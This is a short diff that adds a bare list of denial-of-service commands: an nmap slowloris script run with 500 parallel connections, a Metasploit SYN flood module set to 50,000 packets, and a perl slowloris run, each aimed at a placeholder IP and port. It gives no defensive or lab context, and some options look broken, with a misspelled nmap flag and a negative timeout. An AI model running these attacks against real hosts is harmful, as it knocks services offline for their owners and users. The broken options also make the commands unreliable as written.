@@ -1,0 +1,12 @@
+
+1) nmap --script http-slowloris --max-paralelism 500 IP
+
+a) msfconsole
+
+use auxiliary/dos/tcp/synflood
+set rhost IP
+set rport PORT
+set num 50000
+run
+
+b) perl slowloris.pl -dns IP -timeout -10 -num 5090
